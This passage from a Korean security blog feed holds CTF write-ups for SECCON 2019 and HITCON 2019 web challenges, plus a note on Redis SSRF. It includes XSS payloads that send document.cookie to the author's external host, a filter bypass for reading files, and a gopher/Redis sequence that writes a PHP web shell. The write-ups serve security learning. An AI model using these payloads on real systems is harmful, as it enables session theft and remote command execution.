class="actionscript"><span class="keyword">const</span> normalized = genre.split(<span class="string">'/'</span>)[<span class="number">0</span>].toLowerCase();</span></span><br><span class="line"></span><br><span class="line">if (genreColors.has(normalized)) &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> genreColors.get(normalized);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">'#777'</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">el: <span class="string">'#app'</span>,</span></span><br><span class="line">data() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">isLoading: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">isActive: <span class="literal">false</span>,</span></span><br><span class="line"><span class="actionscript">route: <span class="string">'home'</span>,</span></span><br><span class="line">contest: &#123;&#125;,</span><br><span class="line">contests: [],</span><br><span class="line"><span class="actionscript">contestId: <span class="literal">null</span>,</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">computed: &#123;</span><br><span class="line">flagCount() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="keyword">this</span>.contest.flags === <span class="literal">undefined</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">'No flags'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="keyword">this</span>.contest.flags.length === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">'1 flag'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.contest.flags.length&#125;</span> flags`</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">name() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="keyword">this</span>.contest.name || location.hash.slice(<span class="number">1</span>);</span></span><br><span class="line">&#125;,</span><br><span class="line">flags() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="keyword">this</span>.contest.flags;</span></span><br><span class="line">&#125;,</span><br><span class="line">start() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="keyword">this</span>.contest.date === <span class="literal">undefined</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">'---'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="keyword">this</span>.contest.date.start).toLocaleString();</span></span><br><span class="line">&#125;,</span><br><span class="line">end() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="keyword">this</span>.contest.date === <span class="literal">undefined</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="string">'---'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="keyword">this</span>.contest.date.end).toLocaleString();</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="keyword">async</span> mounted() &#123;</span></span><br><span class="line"><span class="actionscript">addEventListener(<span class="string">'hashchange'</span>, <span class="keyword">this</span>.onHashChange);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">await</span> <span class="keyword">this</span>.onHashChange();</span></span><br><span class="line"><span class="javascript"><span class="keyword">await</span> <span class="keyword">this</span>.fetchContests();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isLoading = <span class="literal">false</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="keyword">async</span> fetchContest(contestId) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">this</span>.contest = <span class="keyword">await</span> $.getJSON(<span class="string">`/<span class="subst">$&#123;contestId&#125;</span>.json`</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="keyword">async</span> fetchContests() &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">this</span>.contests = <span class="keyword">await</span> $.getJSON(<span class="string">'/contests.json'</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="keyword">async</span> onHashChange() &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> contestId = location.hash.slice(<span class="number">1</span>);</span></span><br><span class="line">if (contestId) &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (contestId === <span class="string">'report'</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.goReport();</span></span><br><span class="line"><span class="actionscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">await</span> <span class="keyword">this</span>.goContest(contestId);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.goHome();</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="keyword">async</span> goContest(contestId) &#123;</span></span><br><span class="line"><span class="javascript">location.hash = <span class="string">`#<span class="subst">$&#123;contestId&#125;</span>`</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.route = <span class="string">'contest'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.contestId = contestId;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isLoading = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isActive = <span class="literal">false</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">await</span> <span class="keyword">this</span>.fetchContest(contestId);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isLoading = <span class="literal">false</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">goHome() &#123;</span><br><span class="line"><span class="actionscript">location.hash = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.route = <span class="string">'home'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.contestId = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.contest = &#123;&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isActive = <span class="literal">false</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">goReport() &#123;</span><br><span class="line"><span class="actionscript">location.hash = <span class="string">'#report'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.route = <span class="string">'report'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.contestId = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.contest = &#123;&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.isActive = <span class="literal">false</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">getGenreColor(genre) &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> getGenreColor(genre);</span></span><br><span class="line">&#125;,</span><br><span class="line">getDateString(date) &#123;</span><br><span class="line"><span class="javascript"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(date.seconds * <span class="number">1000</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> d.toISOString().split(<span class="string">'T'</span>)[<span class="number">0</span>];</span></span><br><span class="line">&#125;,</span><br><span class="line">getDateStringJa(date) &#123;</span><br><span class="line"><span class="javascript"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>(date.seconds * <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;d.getFullYear()&#125;</span>/<span class="subst">$&#123;d.getMonth() + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;d.getDate()&#125;</span>`</span>;</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">head() &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">title: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.contestId&#125;</span> - SECCON Flags Archive`</span>,</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Vue 어플리케이션의 XSS 문제입니다.<br>소스가 꽤 긴편인데, 열심히 분석했음에도 취약점이 보이지 않았으므로<br>문제에서 사용하는 jQuery 함수에 대해 탐색해 보았고, 정답을 찾을 수 있었습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://poc.rwx.kr/seccon_spa.js</span></span><br><span class="line">location = <span class="string">'http://rwx.kr?cookie='</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="comment">// javascript</span></span><br><span class="line">$.getJSON(<span class="string">'//poc.rwx.kr/seccon_spa.js?callback=?'</span>)</span><br><span class="line"><span class="comment">// final url</span></span><br><span class="line">http:<span class="comment">//spa.chal.seccon.jp:18364/#/poc.rwx.kr/seccon_spa.js?callback=?&amp;</span></span><br></pre></td></tr></table></figure><p>jQuery의 <code>getJSON</code> 함수는 인자로 전달되는 url에서 callback 파라미터가 ? 으로 지정되어 있을 때, ?을 <code>jQuery34107409498085120296_1571575807022</code> 와 같은 랜덤 문자열으로 치환하여 전송합니다.<br>이는 jsonp 에 대응하기 위해서 존재하는 부분인데, 이러한 상황에서 jQuery 는 가져온 문자열을 스크립트로 해석하여 실행합니다.<br>hash 를 통해, 서버에 전달되는 url을 조작하는 것이 가능하므로, 서버에 임의의 스크립트를 업로드 한 후 요청하면<br>문제가 요구하는 대로 쿠키를 가져올 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Seccon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccon 2019 - fileserver</title>
      <link href="/seccon-2019-fileserver/"/>
      <url>/seccon-2019-fileserver/</url>
      
        <content type="html"><![CDATA[<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'webrick'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'fileutils'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> WEBrick::HTTPStatus</span><br><span class="line"></span><br><span class="line">FileUtils.rm_rf(<span class="string">'/tmp/flags'</span>)</span><br><span class="line">FileUtils.mkdir_p(<span class="string">'/tmp/flags'</span>)</span><br><span class="line">FileUtils.cp(<span class="string">'flag.txt'</span>, <span class="string">"/tmp/flags/<span class="subst">#&#123;SecureRandom.alphanumeric(<span class="number">32</span>)&#125;</span>.txt"</span>)</span><br><span class="line">FileUtils.rm(<span class="string">'flag.txt'</span>)</span><br><span class="line"></span><br><span class="line">server = WEBrick::HTTPServer.new <span class="symbol">Port:</span> <span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad_path</span><span class="params">(path)</span></span></span><br><span class="line">  bad_char = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">  <span class="string">%w(* ? [ &#123; \\)</span>.each <span class="keyword">do</span> <span class="params">|char|</span></span><br><span class="line">    <span class="keyword">if</span> path.<span class="keyword">include</span>? char</span><br><span class="line">      bad_char = char</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> bad_char.<span class="literal">nil</span>?</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># check if brackets are paired</span></span><br><span class="line">    <span class="keyword">if</span> bad_char == ?&#123;</span><br><span class="line">      path[path.index(bad_char)..].<span class="keyword">include</span>? ?&#125;</span><br><span class="line">    <span class="keyword">elsif</span> bad_char == ?[</span><br><span class="line">      path[path.index(bad_char)..].<span class="keyword">include</span>? ?]</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">server.mount_proc <span class="string">'/'</span> <span class="keyword">do</span> <span class="params">|req, res|</span></span><br><span class="line">  raise BadRequest <span class="keyword">if</span> is_bad_path(req.path)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> req.path.end_with? <span class="string">'/'</span></span><br><span class="line">    <span class="keyword">if</span> req.path.<span class="keyword">include</span>? <span class="string">'.'</span></span><br><span class="line">      raise BadRequest</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    files = Dir.glob(<span class="string">".<span class="subst">#&#123;req.path&#125;</span>*"</span>)</span><br><span class="line">    res[<span class="string">'Content-Type'</span>] = <span class="string">'text/html'</span></span><br><span class="line">    res.body = ERB.new(File.read(<span class="string">'index.html.erb'</span>)).result(binding)</span><br><span class="line">    <span class="keyword">next</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  matches = Dir.glob(req.path[<span class="number">1</span>..])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> matches.empty?</span><br><span class="line">    raise NotFound</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    file = File.open(matches.first, <span class="string">'rb'</span>)</span><br><span class="line">    res[<span class="string">'Content-Type'</span>] = server.config[<span class="symbol">:MimeTypes</span>][File.extname(req.path)[<span class="number">1</span>..]]</span><br><span class="line">    res.body = file.read(<span class="number">1</span>e6)</span><br><span class="line">  <span class="keyword">rescue</span> Errno::EISDIR =&gt; e</span><br><span class="line">    res.set_redirect(MovedPermanently, req.path + <span class="string">'/'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">trap <span class="string">'INT'</span> <span class="keyword">do</span> server.shutdown <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">server.start</span><br></pre></td></tr></table></figure><p>플래그를 랜덤한 이름의 디렉토리에 보관하고 있습니다.<br>본 문제를 해결하기 위해서는, 먼저 %00을 이용하여 /tmp/flags/ 디렉토리를 리스팅해 폴더명을 확인하고, 정규식을 사용해 파일을 읽으면 됩니다.</p><h2 id="Index-tmp-flags"><a href="#Index-tmp-flags" class="headerlink" title="Index /tmp/flags"></a>Index /tmp/flags</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl fileserver.chal.seccon.jp:9292&#x2F;%00&#x2F;tmp&#x2F;flag&#x2F;* -o-</span><br></pre></td></tr></table></figure><p>Ruby의 Dir.glob 함수에서는, 인자로 전달된 문자열에 널 바이트가 포함되어 있으면, 널바이트를 포함하여 이전 문자를 모두 무시합니다.<br>따라서 위와 같은 url을 호출하면 앞의 <code>.</code> 이 무시되므로, /tmp/flags 폴더를 리스팅 할 수 있게 됩니다.</p><h2 id="Read-Flag"><a href="#Read-Flag" class="headerlink" title="Read Flag"></a>Read Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;fileserver.chal.seccon.jp:9292&#x2F;%7B%5B,%7D&#x2F;tmp&#x2F;flags&#x2F;z7o449HYi3earE06WIlxYHatX1s2iWgg.txt</span><br></pre></td></tr></table></figure><p>Ruby의 Dir.glob 함수에서 <code>[</code> 문자열은 문자열셋 매칭에 사용되는 메타 문자이지만, 중괄호 안에서 단독으로 사용될 경우, 무시될 수 있습니다.<br>또한 is_bad_path 함수를 보면, path 변수에 <code>* ? [ { \</code> 순서대로 존재를 확인하여 break 하고, 괄호에 대해서는 대응하는 짝이 없으면 무시한다는 논리 취약점이 존재하고 있습니다.<br>따라서 <code>{[,}</code> 를 앞에 첨가하는 것으로 필터링을 우회하고 파일을 읽을 수 있었습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seccon </tag>
            
            <tag> Directory Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon 2019 - bounty pl33z</title>
      <link href="/hitcon-2019-bounty-pl33z/"/>
      <url>/hitcon-2019-bounty-pl33z/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $q = <span class="keyword">isset</span>($_GET[<span class="string">'q'</span>])? $_GET[<span class="string">'q'</span>]: <span class="string">''</span>;</span><br><span class="line">    $q = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>, <span class="string">"/"</span>, <span class="string">"\\"</span>, <span class="string">"&lt;"</span>, <span class="string">"."</span>), <span class="string">""</span>, $q);</span><br><span class="line">    <span class="keyword">if</span>( substr_count($q, <span class="string">"'"</span>) &gt; <span class="number">1</span>) $q = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, $q);</span><br><span class="line">    <span class="keyword">if</span>( substr_count($q, <span class="string">'"'</span>) &gt; <span class="number">1</span>) $q = str_replace(<span class="string">'"'</span>, <span class="string">""</span>, $q);</span><br><span class="line">    $host = $q . <span class="string">".orange.ctf"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>/&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="keyword">if</span> (window.top == window.<span class="keyword">self</span>) &#123;</span><br><span class="line">            window.<span class="keyword">self</span>.location.href = <span class="string">"https://&lt;?=$host;?&gt;/oauth/authorize?client_id=1&amp;scope=read&amp;redirect_uri=https://twitter.com/orange_8361"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> data = JSON.stringify(&#123;</span><br><span class="line">                message: <span class="string">'CTF.API.remote'</span>,</span><br><span class="line">                data: &#123;</span><br><span class="line">                    location: <span class="string">"https://&lt;?=$host;?&gt;/oauth/authorize?client_id=1&amp;scope=read&amp;redirect_uri=https://twitter.com/orange_8361"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            window.<span class="keyword">parent</span>.postMessage(</span><br><span class="line">                data, </span><br><span class="line">                <span class="string">"https://&lt;?=$host;?&gt;"</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>hitcon 2019 에서 출제된 xss 문제로 알려진 풀이는 두가지입니다.</p><h2 id="Intended-Solution"><a href="#Intended-Solution" class="headerlink" title="Intended Solution"></a>Intended Solution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;3.114.5.202&#x2F;fd.php?q&#x3D;rwx%252ekr?&quot;%2bdocument[&#96;cookie&#96;]%E2%80%A8--&gt;</span><br></pre></td></tr></table></figure><p>오렌지가 공개한 의도된 풀이로 <code>--&gt;</code> 문자를 사용해 해결하는 방법입니다.<br>다만 <code>--&gt;</code> 를 문자열 직후에 넣는다면, <code>--</code> 가 postfix 연산자로 해석되어 <code>Invalid left-hand side expression in postfix operation</code> 오류를 발생시키므로 <code>crlf</code> 등을 통해 개행 처리를 해 주어야 합니다.<br>일반적인 화이트 스페이스는 필터링 되어 있지만, <code>\u2028</code>, <code>\u2029</code> 등을 통해 대체할 수 있습니다.</p><p>이외에 자바스크립트 상에서 공백으로 해석될 수 있는 문자들은 다음과 같습니다.<br><code>9 - 13, 32, 160, 5760, 8192 - 8202, 8232, 8233, 8239, 8287, 12288, 65279</code></p><h2 id="Unintended-Solution"><a href="#Unintended-Solution" class="headerlink" title="Unintended Solution"></a>Unintended Solution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3.114.5.202&#x2F;fd.php?q&#x3D;rwx.kr?&#96;%2b&quot;%2bdocument[&#96;cookie&#96;];(&#96;$&#123;&#96;</span><br></pre></td></tr></table></figure><p>마찬가지로 오렌지가 발표한 unintended solution 입니다.<br>nested template string 을 사용하여 문제를 해결할 수 있습니다.</p><h2 id="My-Solution"><a href="#My-Solution" class="headerlink" title="My Solution"></a>My Solution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3.114.5.202&#x2F;fd.php?q&#x3D;rwx%252ekr%23%60%7D,&quot;,(%60,class%20$%7Bx&#x3D;%60$%7B(import(&#96;http:rwx%252ekr?&#96;%2bdocument[&#96;cookie&#96;]))%7D%7D;</span><br></pre></td></tr></table></figure><p>위는 제가 풀이에 사용한 방법입니다.</p><p>기본적으로 오렌지의 두번째 풀이와 비슷하게 nested template string 을 사용하여 문제를 해결하였습니다. template string 내부에서의 expression interpolation인 <code>${</code>expression<code>}</code> 와 같은 형태로 서브 스크립트를 포함할 수 있는데, 거기에 추가로 class 정의식인 ${ … } 를 활용하여 문제를 해결한 것입니다.<br>첫번째 reflecting point에서 홀수의 backtick 으로 종결되면 첫 reflecting point 에서 backtick 내부에 포함되었던 “${}” expression 이 두번째 문장에서는 backtick 밖에서 실행되기에, 여기서 SyntaxError 가 발생합니다. 따라서 저는 이를 방지해 주기 위해 prefix로 class 예약어를 사용하였습니다. 쿼트 밖에서 “${}”는 SyntaxError를 발생시키지만 “class ${}” 는 오류를 일으키지 않으니까요. 마지막으로 뒤에 스크립트를 추가한다고 해도 location=”https:// … “ 은 여전히 실행되어 스크립트가 실행되기 전에 페이지가 리다이렉션 될 수 있으므로, 자바스크립트의 비동기적 특성에 기인하여 import 를 사용해 redirection 되기 전에 다른 서버로 쿠키를 전송되도록 했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/orangetw/My-CTF-Web-Challenges" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Hitcon CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis SSRF</title>
      <link href="/redis-ssrf/"/>
      <url>/redis-ssrf/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@914e18c9bf8c:/<span class="comment"># curl localhost:6379</span></span><br><span class="line">-ERR wrong number of arguments <span class="keyword">for</span> <span class="string">'get'</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><code>redis</code>는 <code>인메모리 캐시 서버</code>로 데이터를 메모리에 보관하기에 상당한 성능을 보입니다. 기본 설정에서 <code>6379</code>번 포트를 사용하고, 수신된 명령어를 라인 단위로 수행합니다. <code>redis</code>는 <code>http</code> 프로토콜을 지원하고 있지 않으므로 <code>gopher</code> 등을 이용하여 <code>ssrf</code>를 유발해야 합니다. 예외적으로 <code>request method</code> 를 자유롭게 수정 가능하거나 첫 라인에 <code>CRLF Injection</code>이 가능한 경우 <code>http</code> 요청을 통해서도 발생할 수도 있습니다.</p><p><code>redis</code> 버전에 따라 <code>http request</code> 의 첫 라인과 같이 <code>redis</code> 명령으로 해석되어 오류가 발생하는 경우에도 메시지만 띄우고 다음 라인을 실행할 수도 있습니다. 이런 경우에는 <code>http</code> 의 경우에도 <code>header / body</code>에 데이터 작성이 가능하면 명령 실행이 가능할 것 같네요.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FLUSHALL</span><br><span class="line">SET myshell <span class="string">"&lt;?php system($_GET['cmd']); ?&gt;"</span></span><br><span class="line">CONFIG SET DIR /tmp</span><br><span class="line">CONFIG SET DBFILENAME exploit.php </span><br><span class="line">SAVE</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure><p><code>save</code> 명령어는 <code>config dir</code> 경로에 데이터 베이스를 덤프하는데, <code>value</code>는 <code>raw text</code> 형식으로 저장되기 때문에 서버 내부에서 <code>others</code>에 쓰기 권한이 지정된 디렉터리에 저장하는 것으로 상황에 따라 <code>rce</code>를 유발하거나, lfi 등에 사용될 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20/tmp%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT</span><br></pre></td></tr></table></figure><p>gopher를 통한 파일 업로드 예입니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@914e18c9bf8c:/<span class="comment"># ls -al /tmp</span></span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwt 1 root  root  4096 Oct  3 05:46 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Oct  3 05:43 ..</span><br><span class="line">-rw-r--r-- 1 redis redis  117 Oct  3 05:46 exploit.php</span><br></pre></td></tr></table></figure><p>save 명령어를 통해 저장된 파일의 권한은 644 이므로, 웹 서버에 업로드 했을 때에 www-data 권한으로 읽을 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
